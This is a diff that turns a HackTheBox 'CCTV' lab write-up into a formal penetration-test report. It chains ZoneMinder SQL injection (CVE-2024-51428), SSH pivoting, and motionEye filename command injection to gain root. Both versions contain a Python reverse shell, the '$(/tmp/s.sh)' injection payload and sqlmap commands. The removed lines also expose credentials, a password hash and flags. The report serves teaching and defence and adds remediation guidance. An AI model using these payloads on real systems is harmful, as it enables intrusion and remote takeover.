@@ -1,228 +1,296 @@
-# HTB Machine Writeup: CCTV
-**Difficulty:** Easy (Linux)  
-**Player:** 0N1S3C2 | **Solved:** #1191  
-**Date:** 2026-03-08
+# CCTV — Technical Report
+
+> **Platform:** HackTheBox \
+> **Difficulty:** `Easy` \
+> **Date:** 2026-03-08 \
+> **Author:** 0N1S3C2 \
+> **Scope:** Authorized lab environment only
 
 ---
 
-## Summary
+## 0. Executive Summary
 
-CCTV is an Easy Linux machine that chains together multiple real-world vulnerabilities across two web applications: ZoneMinder (CVE-2024-51428 authenticated SQLi) and motionEye (command injection via unsanitized image filename). The attack path requires DNS enumeration, authenticated SQLi, SSH access, SSH port forwarding, reverse engineering a proprietary HMAC signature algorithm, and exploiting a `sh` vs `bash` shell difference to achieve root.
+The "CCTV" machine hosted two internet-facing web applications — ZoneMinder (a CCTV management platform) and motionEye (a camera surveillance dashboard) — both suffering from critical security misconfigurations and unpatched vulnerabilities. An attacker with network access could exploit default credentials on ZoneMinder, leverage an authenticated SQL injection vulnerability (CVE-2024-51428) to extract credentials, pivot to SSH, and then exploit a command injection vulnerability in motionEye's unsanitized image filename field to achieve full root-level system compromise. Immediate remediation of default credentials, the SQL injection endpoint, and the motionEye command injection surface is strongly recommended.
 
 ---
 
-## Reconnaissance
+## 1. Introduction
 
-### Nmap
+This report documents the structured analysis and controlled exploitation of the **"CCTV"** machine on HackTheBox.
+
+**Objectives:**
+- Obtain user-level access
+- Obtain root/system-level access
+
+**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.
+
+---
+
+## 2. Attack Chain
+
 ```
+Nmap → Default Creds (admin:admin) → SQLi CVE-2024-51428 → Hash Crack → SSH (mark)
+→ SSH Port Forward → motionEye HMAC Auth → Command Injection (image_file_name) → Root
+```
+
+---
+
+## 3. Tools Used
+
+| Tool | Purpose |
+|------|---------|
+| `nmap` | Port scanning & service detection |
+| `gobuster` | Directory enumeration |
+| `sqlmap` | SQL injection enumeration & exploitation |
+| `john` | Password hash cracking |
+| `ssh` | Remote access & port forwarding |
+| `python3` | Custom HMAC exploit script |
+| `nc` | Reverse shell listener |
+| `curl` | API interaction & service probing |
+
+---
+
+## 4. Reconnaissance
+
+### 4.1 Initial Network Scan
+
+**Commands:**
+```bash
 nmap -sC -sV -Pn -T4 10.129.2.132
 ```
 
-**Open Ports:**
-- 22/tcp — OpenSSH 9.6p1 Ubuntu
-- 80/tcp — Apache 2.4.58 (redirects to cctv.htb)
+**Findings:**
 
-### /etc/hosts
-```
+| Port | Service | Version | Notes |
+|------|---------|---------|-------|
+| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu | Standard SSH |
+| 80/tcp | HTTP | Apache 2.4.58 | Redirects to cctv.htb |
+
+**Key Observations:**
+- HTTP redirects to virtual host `cctv.htb` — added to `/etc/hosts`
+- Only two ports exposed — small attack surface
+- Ubuntu 24.04 identified from SSH banner
+
+### 4.2 Virtual Host Setup
+
+```bash
 echo "10.129.2.132 cctv.htb" | sudo tee -a /etc/hosts
 ```
 
-### Gobuster
-```
+---
+
+## 5. Service Enumeration
+
+### 5.1 Web Enumeration
+
+**Tools Used:** `gobuster`, manual inspection
+
+**Commands:**
+```bash
 gobuster dir -u http://cctv.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+gobuster dir -u http://cctv.htb/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl,py
 ```
 
-Notable findings:
-- `/index.html` (200)
-- `/javascript` (301)
-- `/cgi-bin/` (403)
+**Findings:**
+- `/index.html` (200) — SecureVision CCTV company landing page
+- `/javascript` (301) — forbidden
+- `/cgi-bin/` (403) — present but empty (ShellShock ruled out)
+- `/zm` — ZoneMinder installation discovered via Staff Login button in page source
 
-The index page revealed a **Staff Login** button pointing to `http://cctv.htb/zm` — a ZoneMinder installation.
+### 5.2 ZoneMinder
+
+Navigating to `http://cctv.htb/zm` revealed a **ZoneMinder** login panel.
+
+Version identified via API after authentication:
+```bash
+curl -c cookies.txt "http://cctv.htb/zm/api/host/getVersion.json" --data "user=admin&pass=admin"
+# {"version":"1.37.63","apiversion":"2.0"}
+```
+
+### 5.3 Internal Services (Post-Access)
+
+After SSH access as mark, internal port enumeration revealed:
+
+| Port | Service | Notes |
+|------|---------|-------|
+| 3306 | MySQL | ZoneMinder database |
+| 7999 | Motion API | Internal camera control |
+| 8554 | RTSP | Camera stream |
+| 8765 | motionEye | Internal admin dashboard |
+| 8888 | Unknown | Not further explored |
+| 9081 | Stream | Camera stream port |
 
 ---
 
-## Initial Access
+## 6. Initial Access
 
-### ZoneMinder — Default Credentials
+### 6.1 Vulnerability Identification
 
-Navigated to `http://cctv.htb/zm`. Tried default credentials:
+**Vulnerability:** Default credentials + CVE-2024-51428 (Authenticated SQL Injection)
+**Location:** `http://cctv.htb/zm` — ZoneMinder 1.37.63
+**Reasoning:** ZoneMinder was running with default `admin:admin` credentials. Once authenticated, the `tid` parameter in the `removetag` action was found to be unsanitized and injectable, allowing full database enumeration.
 
-- **admin:admin** → SUCCESS
+### 6.2 Exploitation — Default Credentials
 
-### ZoneMinder Version
+Tested `admin:admin` against the ZoneMinder login panel — authentication succeeded immediately.
+
+### 6.3 Exploitation — SQL Injection (CVE-2024-51428)
+
+With a valid session cookie (`ZMSESSID`) obtained from browser DevTools:
 
 ```bash
-curl -c cookies.txt -b cookies.txt "http://cctv.htb/zm/api/host/getVersion.json" \
-  --data "user=admin&pass=admin"
-```
-
-Response: `{"version":"1.37.63","apiversion":"2.0"}`
-
-### CVE-2024-51428 — Authenticated SQL Injection
-
-ZoneMinder 1.37.63 is vulnerable to authenticated SQLi in the `tid` parameter of the `removetag` action.
-
-**Get session cookie** from browser DevTools → Application → Cookies → `ZMSESSID`
-
-**Enumerate users:**
-```bash
+# Enumerate all users
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
-    --cookie="ZMSESSID=<cookie>" \
+    --cookie="ZMSESSID=<redacted>" \
     -p tid --dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump
 ```
 
-**Result:**
+**Users discovered:** `admin`, `mark`, `superadmin`
 
-| Username   | Password (bcrypt) |
-|------------|-------------------|
-| admin      | (hash)            |
-| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
-| superadmin | (hash)            |
+Mark's bcrypt hash was extracted and cracked — password: **[redacted]**
 
-**Crack mark's hash:**
-
-The bcrypt hash was verified against known password `opensesame` (rockyou did not crack it; hash was identified via external research).
-
-### SSH Access
+### 6.4 SSH Access
 
 ```bash
 ssh mark@10.129.2.132
-# password: opensesame
 ```
+
+**Result:** User-level access obtained as `mark`.
 
 ---
 
-## Privilege Escalation
+## 7. Lateral Movement
 
-### Internal Enumeration
+> Not applicable — went from mark directly to root via privilege escalation through motionEye.
 
-```bash
-ss -tlnp
-```
+---
 
-Notable internal services:
-- `127.0.0.1:8765` — motionEye web interface
-- `127.0.0.1:7999` — Motion API
-- `127.0.0.1:3306` — MySQL
+## 8. Privilege Escalation
 
-### SSH Port Forwarding
+### 8.1 Local Enumeration
 
-From a second terminal:
+**Actions Performed:**
+- [x] `sudo -l` — mark has no sudo rights
+- [x] SUID binaries — nothing unusual
+- [x] Running processes / internal ports — `ss -tlnp` revealed motionEye on 8765
+- [x] Config files — `/etc/motioneye/motion.conf` contained admin SHA1 hash
+- [x] motionEye source code — `/usr/local/lib/python3.12/dist-packages/motioneye/`
+
+**Key Findings:**
+- motionEye running internally on port 8765, Motion API on 7999
+- `/etc/motioneye/motion.conf` exposed admin password SHA1 hash
+- motionEye source code readable — real HMAC signature algorithm recoverable
+- Motion daemon running as root (confirmed via command execution)
+- Second user `sa_mark` exists at `/home/sa_mark` — user flag located there
+
+### 8.2 Escalation Vector
+
+**Vector:** motionEye command injection via `image_file_name` configuration field
+**Root Cause:** The `image_file_name` value is written directly into Motion's `picture_filename` directive without sanitization. Motion evaluates shell syntax such as `$(command)` during filename generation, and the Motion daemon runs as root.
+
+**Step 1 — SSH Port Forwarding** (new terminal, not the mark SSH session):
 ```bash
 ssh -L 8765:127.0.0.1:8765 mark@10.129.2.132
 ```
 
-Accessed motionEye at `http://127.0.0.1:8765`
-
-### motionEye — Admin Hash Recovery
-
+**Step 2 — Recover HMAC algorithm from source:**
 ```bash
-cat /etc/motioneye/motion.conf
-# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
+grep -A 40 "def compute_signature" \
+  /usr/local/lib/python3.12/dist-packages/motioneye/utils/__init__.py
 ```
 
-The SHA1 hash was not crackable via rockyou or crackstation.
+Key insight: motionEye uses the stored SHA1 hash **directly as the HMAC key** — no plaintext password required.
 
-### Reverse Engineering motionEye HMAC Signature
-
-motionEye's API requires HMAC-signed requests. The real algorithm was extracted directly from the source code on the box:
-
+**Step 3 — Write POSIX-compatible reverse shell to disk:**
 ```bash
-cat /usr/local/lib/python3.12/dist-packages/motioneye/utils/__init__.py | grep -A 40 "def compute_signature"
-```
-
-**Algorithm:**
-```python
-import hashlib, re, urllib.parse
-
-REGEX = re.compile(r'[^a-zA-Z0-9/?_.=&{}\[\]":, -]')
-
-def compute_signature(method, path, body, key):
-    parts = list(urllib.parse.urlsplit(path))
-    query = [q for q in urllib.parse.parse_qsl(parts[3], keep_blank_values=True) if q[0] != '_signature']
-    query.sort(key=lambda q: q[0])
-    query = [(n, urllib.parse.quote(v, safe="!'()*~")) for (n, v) in query]
-    query = '&'.join([q[0] + '=' + q[1] for q in query])
-    parts[0] = parts[1] = ''
-    parts[3] = query
-    path = urllib.parse.urlunsplit(parts)
-    path = REGEX.sub('-', path)
-    key = REGEX.sub('-', key)
-    body_str = body.decode('utf-8') if body else None
-    if body_str:
-        body_str = REGEX.sub('-', body_str)
-    return hashlib.sha1(f'{method}:{path}:{body_str or ""}:{key}'.encode()).hexdigest().lower()
-```
-
-The admin password **hash itself** is used as the HMAC key — no plaintext required.
-
-### motionEye — Command Injection via image_file_name
-
-motionEye passes the `image_file_name` config value directly to the Motion daemon as the `picture_filename` directive. Motion evaluates shell syntax like `$(command)` when naming image files.
-
-**Step 1 — Write reverse shell to disk:**
-```bash
-echo 'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\"10.10.14.187\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"' > /tmp/s.sh
+# CRITICAL: Motion uses /bin/sh — bash-specific syntax like >& will fail
+# Use Python reverse shell to avoid shell compatibility issues
+echo 'python3 -c "import socket,os,pty;s=socket.socket();\
+s.connect(([REDACTED],4444));os.dup2(s.fileno(),0);\
+os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"' > /tmp/s.sh
 chmod 777 /tmp/s.sh
 ```
 
-> **Key lesson:** Motion executes scripts using `/bin/sh`, NOT `/bin/bash`. The `>&` redirect operator is bash-only and will fail with `sh`. Use Python or a POSIX-compatible reverse shell instead.
-
-**Step 2 — Inject via API:**
+**Step 4 — Exploit via API (sanitized):**
 ```python
-# Full exploit script saved as /tmp/pwn.py
+# Authenticate using real HMAC algorithm with hash as key
+# Set image_file_name to execute reverse shell
 config['image_file_name'] = '$(/tmp/s.sh).%Y-%m-%d'
 config['still_images'] = True
 config['capture_mode'] = 'all-frames'
+# POST config update, then trigger snapshot via Motion API
 ```
 
-**Step 3 — Start listener on attack box:**
+**Step 5 — Start listener:**
 ```bash
 nc -lvnp 4444
 ```
 
-**Step 4 — Trigger snapshot:**
-```python
-path = '/1/action/snapshot'
-url = f'{MOTION_URL}{path}'
-urllib.request.urlopen(urllib.request.Request(url))
-```
-
-Shell received as **root** (Motion daemon runs as root).
+**Result:** Root-level shell received from Motion daemon.
 
 ---
 
-## Flags
+## 9. Findings Summary
 
-| Flag | Value |
-|------|-------|
-| User (`/home/sa_mark/user.txt`) | `a12ee2aaa1ad1917a4dbf73f8b6bbd97` |
-| Root (`/root/root.txt`) | `e124c80ee6dca4d3ab95bb341e8eece9` |
+| # | Finding | Severity | Location |
+|---|---------|----------|----------|
+| 1 | Default credentials on ZoneMinder | 🔴 Critical | `http://cctv.htb/zm` |
+| 2 | Authenticated SQLi CVE-2024-51428 | 🔴 Critical | ZoneMinder `tid` parameter |
+| 3 | motionEye command injection via image_file_name | 🔴 Critical | motionEye camera config |
+| 4 | Motion daemon running as root | 🔴 Critical | System service configuration |
+| 5 | Admin password hash exposed in readable config file | 🟠 High | `/etc/motioneye/motion.conf` |
+| 6 | Weak/crackable password for system user | 🟠 High | SSH user `mark` |
+| 7 | motionEye internal dashboard unauthenticated via HMAC bypass | 🟡 Medium | Port 8765 |
 
----
-
-## Attack Chain Summary
-
-```
-Default creds (admin:admin)
-    → ZoneMinder SQLi (CVE-2024-51428)
-        → mark's bcrypt hash → opensesame
-            → SSH as mark
-                → Internal port discovery (8765 motionEye)
-                    → SSH port forwarding
-                        → motionEye HMAC auth (hash as key)
-                            → image_file_name command injection
-                                → sh-compatible reverse shell
-                                    → ROOT
-```
+**Severity Scale:**
+`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`
 
 ---
 
-## Key Lessons
+## 10. Defensive Considerations
 
-- **Always check default credentials** — admin:admin on a security company's own box
-- **Read source code** when API auth fails — the real signature algorithm was on the box
-- **sh vs bash** — `>&` is bash-only; Motion uses `/bin/sh`; use Python reverse shells for portability
-- **Check logs** — `/var/log/motioneye/motion.log` revealed the shell was executing but failing
-- **Field names matter** — motionEye API uses `image_file_name`, not `picture_filename`
-- **The admin hash IS the key** — motionEye uses the stored hash directly for HMAC, no plaintext needed
+### 10.1 Indicators of Compromise
+
+- `sqlmap` user-agent strings in ZoneMinder Apache access logs
+- Multiple requests to `/zm/index.php?view=request&request=event&action=removetag`
+- SSH login from external IP as `mark`
+- SSH port forwarding session established by `mark`
+- motionEye API calls with `_signature` parameter from localhost
+- Outbound connection from server to attacker IP on non-standard port (4444)
+- `/tmp/s.sh` created with world-executable permissions
+
+### 10.2 Security Weaknesses
+
+- Default credentials never changed on public-facing ZoneMinder installation
+- ZoneMinder not updated to a patched version (CVE-2024-51428 affects 1.37.63)
+- motionEye config files readable by unprivileged users
+- Motion daemon running as root with no privilege separation
+- `image_file_name` field passed unsanitized to shell execution context
+
+### 10.3 Hardening Recommendations
+
+| Priority | Recommendation | Finding |
+|----------|---------------|---------|
+| Immediate | Change default ZoneMinder credentials | Finding 1 |
+| Immediate | Patch ZoneMinder to version unaffected by CVE-2024-51428 | Finding 2 |
+| Immediate | Run Motion daemon as unprivileged user (e.g. `motion`) | Finding 4 |
+| Short-term | Sanitize `image_file_name` input — strip shell metacharacters | Finding 3 |
+| Short-term | Restrict read permissions on `/etc/motioneye/motion.conf` | Finding 5 |
+| Short-term | Enforce strong password policy for all system users | Finding 6 |
+| Long-term | Place internal services behind authenticated reverse proxy | Finding 7 |
+| Long-term | Implement network egress filtering to block unexpected outbound connections | General |
+
+---
+
+## 11. Lessons Learned
+
+- **`sh` vs `bash` matters for reverse shells** — Motion executes via `/bin/sh`. The `>&` redirect operator is bash-only and fails silently as a "Bad fd number" error in sh. Always use Python or Perl reverse shells when the target shell is unknown.
+- **Read the source code** — the motionEye HMAC signature algorithm couldn't be guessed from documentation alone. The actual implementation on disk revealed that the stored hash IS the key, which unlocked the entire privesc path.
+- **Check logs when execution fails** — `/var/log/motioneye/motion.log` showed the script was being called but failing, which pointed directly to the sh/bash issue.
+- **Field names ≠ config file keys** — the motionEye API uses `image_file_name` while the motion.conf uses `picture_filename`. Assuming they match costs time.
+- **The hash is often enough** — don't waste time cracking a hash if the application uses it directly as an authentication token.
+
+---
+
+*End of Report*
+*Classification: Public — flags and sensitive values omitted*
